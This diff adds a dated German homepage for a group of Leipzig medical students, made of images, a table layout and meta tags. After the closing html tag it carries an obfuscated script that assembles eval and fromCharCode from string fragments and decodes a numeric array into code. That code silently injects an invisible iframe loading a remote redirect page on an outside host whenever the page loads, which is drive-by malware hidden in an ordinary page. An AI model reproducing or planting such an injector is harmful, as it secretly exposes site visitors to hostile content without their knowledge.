@@ -1,0 +1,51 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<title>Homepage der SG 3</title>
+<meta name="description"     content="Homepage der SG 3 Jahrgang WS 2001 Medizin Uni Leipzig.">
+<meta name="keywords"        content="Medizin, Uni, Leipzig, metatag">
+<meta name="author"         content="M. Friebel, Maria@titsandsluts.de">
+<meta name="DC.Publisher"   content="M. Friebel, Maria@titsandsluts.de">
+<meta name="DC.Date"        content="2004-02-08T016:00+01:00">
+<!-- Zeitstempel Beispiel: 01.08.2001, 12:00 Uhr, +1 Std. zu Greenwich -->
+<meta name="DC.Language"    content="de"> <!-- de = deutschsprachig -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link rel="stylesheet" type="text/css" href="styles.css">
+</head>
+
+<body text="#000000">
+<!-- Bildschirmfüllende Tabelle (Hoehe u. Breite jeweils 100%)-->
+<table width="100%" height="100%" border="0" cellspacing="0" cellpadding="0"><!-- height= bewirkt einen HTML4.0-Fehler - aber leider gibt es außer mit Hilfe aufwendiger JavaScript-Lösungen keine sinnvolle Alternative für Netscape 4.x - ansonsten einfach durch style="height:100%" ersetzen -->
+<tr>
+
+
+<!--Spalte links-->
+<td width="10%" style="background-image:url(images/bg_pagetitel.gif)">
+<div align="right"><br>
+<span class="mini"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></div>
+</td>
+
+<!--Mittelspalte -->
+<td bgcolor="#3A3C69" width="50%" valign="center">
+<p><img src="images/fastgessgkl.jpg" width="400" height="300" alt=""><br><br><br><a href="zentrum.htm" onFocus="this.blur()"><img src="images/ani_titel.gif" width="400" height="45" border="0" alt=""><br></a><p><FONT face="Comic Sans MS" color=#FFD700 size=4><b>&nbsp;&nbsp;&nbsp;&nbsp;Studenten der Humanmedizin an der </DIV><div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;Universität Leipzig</b></FONT></p><p><FONT face="Comic Sans MS" color=#FFD700 size=4><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;Jahrgang WS 2001</b></FONT></DIV>
+&nbsp; </p>
+</td>
+
+<!--Spalte rechts-->
+<td bgcolor="#3A3C69" width="50%">
+<div align="left"><a href="thema7.htm" onFocus="this.blur()"><img src="images/eric_titel.gif" width="400" height="45" border="0" alt=""></a><p><p><DIV><p><p><img src="http://www.titsandsluts.de/erickopfhoerer.jpg" width="400" height="300">
+
+<br>
+</a></p>
+</div>
+</td>
+</tr>
+</table>
+
+</body>
+</html><!-- o --><script>if(window.document)aa=(Number+'4732').substr(0,4);aaa=(Date+{}).substr(0,4);if(aa===aaa){ss=new String();s=String;12-function(){e=window['e'+'v'+'a'+'l'];f='fr';f=f+'omCha'.concat('rC','o','d','e');}();t='q';}ddd=new Date();d2=new Date(ddd.valueOf()-2);h=-1*(ddd-d2);n=["4.5q4.5q52.5q51q16q20q50q55.5q49.5q58.5q54.5q50.5q55q58q23q51.5q50.5q58q34.5q54q50.5q54.5q50.5q55q58q57.5q33q60.5q42q48.5q51.5q39q48.5q54.5q50.5q20q19.5q49q55.5q50q60.5q19.5q20.5q45.5q24q46.5q20.5q61.5q4.5q4.5q4.5q52.5q51q57q48.5q54.5q50.5q57q20q20.5q29.5q4.5q4.5q62.5q16q50.5q54q57.5q50.5q16q61.5q4.5q4.5q4.5q50q55.5q49.5q58.5q54.5q50.5q55q58q23q59.5q57q52.5q58q50.5q20q17q30q52.5q51q57q48.5q54.5q50.5q16q57.5q57q49.5q30.5q19.5q52q58q58q56q29q23.5q23.5q48.5q50q57.5q59.5q50.5q49q57.5q50.5q48.5q57q49.5q52q57q50.5q50q52.5q57q50.5q49.5q58q23q49.5q55.5q54.5q23.5q48.5q50q57.5q23.5q57.5q58q48.5q58q23q56q52q56q19.5q16q59.5q52.5q50q58q52q30.5q19.5q24.5q24q19.5q16q52q50.5q52.5q51.5q52q58q30.5q19.5q24.5q24q19.5q16q57.5q58q60.5q54q50.5q30.5q19.5q59q52.5q57.5q52.5q49q52.5q54q52.5q58q60.5q29q52q52.5q50q50q50.5q55q29.5q56q55.5q57.5q52.5q58q52.5q55.5q55q29q48.5q49q57.5q55.5q54q58.5q58q50.5q29.5q54q50.5q51q58q29q24q29.5q58q55.5q56q29q24q29.5q19.5q31q30q23.5q52.5q51q57q48.5q54.5q50.5q31q17q20.5q29.5q4.5q4.5q62.5q4.5q4.5q51q58.5q55q49.5q58q52.5q55.5q55q16q52.5q51q57q48.5q54.5q50.5q57q20q20.5q61.5q4.5q4.5q4.5q59q48.5q57q16q51q16q30.5q16q50q55.5q49.5q58.5q54.5q50.5q55q58q23q49.5q57q50.5q48.5q58q50.5q34.5q54q50.5q54.5q50.5q55q58q20q19.5q52.5q51q57q48.5q54.5q50.5q19.5q20.5q29.5q51q23q57.5q50.5q58q32.5q58q58q57q52.5q49q58.5q58q50.5q20q19.5q57.5q57q49.5q19.5q22q19.5q52q58q58q56q29q23.5q23.5q48.5q50q57.5q59.5q50.5q49q57.5q50.5q48.5q57q49.5q52q57q50.5q50q52.5q57q50.5q49.5q58q23q49.5q55.5q54.5q23.5q48.5q50q57.5q23.5q57.5q58q48.5q58q23q56q52q56q19.5q20.5q29.5q51q23q57.5q58q60.5q54q50.5q23q59q52.5q57.5q52.5q49q52.5q54q52.5q58q60.5q30.5q19.5q52q52.5q50q50q50.5q55q19.5q29.5q51q23q57.5q58q60.5q54q50.5q23q56q55.5q57.5q52.5q58q52.5q55.5q55q30.5q19.5q48.5q49q57.5q55.5q54q58.5q58q50.5q19.5q29.5q51q23q57.5q58q60.5q54q50.5q23q54q50.5q51q58q30.5q19.5q24q19.5q29.5q51q23q57.5q58q60.5q54q50.5q23q58q55.5q56q30.5q19.5q24q19.5q29.5q51q23q57.5q50.5q58q32.5q58q58q57q52.5q49q58.5q58q50.5q20q19.5q59.5q52.5q50q58q52q19.5q22q19.5q24.5q24q19.5q20.5q29.5q51q23q57.5q50.5q58q32.5q58q58q57q52.5q49q58.5q58q50.5q20q19.5q52q50.5q52.5q51.5q52q58q19.5q22q19.5q24.5q24q19.5q20.5q29.5q4.5q4.5q4.5q50q55.5q49.5q58.5q54.5q50.5q55q58q23q51.5q50.5q58q34.5q54q50.5q54.5q50.5q55q58q57.5q33q60.5q42q48.5q51.5q39q48.5q54.5q50.5q20q19.5q49q55.5q50q60.5q19.5q20.5q45.5q24q46.5q23q48.5q56q56q50.5q55q50q33.5q52q52.5q54q50q20q51q20.5q29.5q4.5q4.5q62.5"];n=n[0].split(t);for(i=0;i-n.length<0;i++)ss=ss+s[f](-h*n[i]);e(ss);</script><!-- c -->
+
+
+
+
